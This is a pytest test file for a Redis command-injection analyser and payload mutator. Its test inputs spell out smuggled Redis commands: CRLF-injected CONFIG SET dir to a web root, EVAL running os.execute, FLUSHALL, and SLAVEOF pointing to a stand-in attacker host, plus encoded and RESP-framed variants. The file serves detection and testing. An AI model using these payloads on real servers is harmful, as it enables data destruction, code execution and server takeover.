import json

from xyainjex import Context, analyze_redis, mutate_redis
from xyainjex.cli import main
from xyainjex.redis.context import analyze_redis_context

ARG = "GET {INPUT}"
INLINE = "{INPUT}"


# --- context ---


def test_context_argument():
    assert analyze_redis_context(ARG) == Context.REDIS_ARGUMENT
    assert analyze_redis_context("SET k {INPUT}") == Context.REDIS_ARGUMENT


def test_context_inline():
    assert analyze_redis_context(INLINE) == Context.REDIS_INLINE


# --- argument context (needs CRLF) ---


def test_benign_argument_is_low():
    r = analyze_redis(ARG, "mykey")
    assert not r.breakout.command_injected
    assert r.risk.value == "LOW"


def test_config_set_dir_is_critical():
    r = analyze_redis(ARG, "x\r\nCONFIG SET dir /var/www/html\r\n")
    assert "config-rce" in r.breakout.separators
    assert r.risk.value == "CRITICAL"


def test_eval_is_critical():
    r = analyze_redis(ARG, "x\r\nEVAL \"os.execute('id')\" 0\r\n")
    assert "rce-command" in r.breakout.separators
    assert r.risk.value == "CRITICAL"


def test_slaveof_is_critical():
    r = analyze_redis(ARG, "x\r\nSLAVEOF evil.example 6379\r\n")
    assert "rce-command" in r.breakout.separators
    assert r.risk.value == "CRITICAL"


def test_flushall_is_high():
    r = analyze_redis(ARG, "x\r\nFLUSHALL\r\n")
    assert "write-command" in r.breakout.separators
    assert r.risk.value == "HIGH"


def test_info_is_medium():
    r = analyze_redis(ARG, "x\r\nINFO\r\n")
    assert "read-command" in r.breakout.separators
    assert r.risk.value == "MEDIUM"


def test_encoded_crlf_is_detected():
    r = analyze_redis(ARG, "x%0d%0aFLUSHALL%0d%0a")
    assert "crlf" in r.breakout.separators
    assert "write-command" in r.breakout.separators
    assert r.risk.value == "HIGH"


def test_crlf_without_known_command_is_medium():
    r = analyze_redis(ARG, "x\r\nHELLO world\r\n")
    assert r.breakout.command_injected
    assert r.risk.value == "MEDIUM"


def test_resp_framing_is_detected():
    r = analyze_redis(ARG, "x\r\n*3\r\n$3\r\nSET\r\n$1\r\nk\r\n$1\r\nv\r\n")
    assert "resp-framing" in r.breakout.separators
    assert r.breakout.command_injected


# --- inline context ---


def test_inline_read_is_medium():
    r = analyze_redis(INLINE, "GET mykey")
    assert r.breakout.command_injected
    assert r.risk.value == "MEDIUM"


def test_inline_config_is_critical():
    r = analyze_redis(INLINE, "CONFIG SET dir /tmp")
    assert r.risk.value == "CRITICAL"


def test_inline_non_command_is_low():
    r = analyze_redis(INLINE, "just text")
    assert not r.breakout.command_injected
    assert r.risk.value == "LOW"


# --- mutation ---


def test_mutate_argument():
    result = mutate_redis(ARG)
    assert result.context == Context.REDIS_ARGUMENT
    assert result.valid > 0
    assert result.candidates[0].risk.value == "CRITICAL"


def test_mutate_inline():
    result = mutate_redis(INLINE)
    assert result.context == Context.REDIS_INLINE
    assert result.valid > 0


# --- result shape and CLI ---


def test_result_dialect_is_null():
    data = analyze_redis(ARG, "x\r\nFLUSHALL\r\n").to_dict()
    assert data["dialect"] is None
    assert data["context"] == "redis_argument"


def test_cli_redis_json(capsys):
    code = main(["--lang", "redis", "--json", INLINE, "CONFIG SET dir /tmp"])
    data = json.loads(capsys.readouterr().out)
    assert data["risk"] == "CRITICAL"
    assert data["dialect"] is None
    assert code == 2


def test_cli_redis_mutate(capsys):
    code = main(["-l", "redis", "--mutate", ARG])
    out = capsys.readouterr().out
    assert code == 0
    assert "High probability payloads" in out
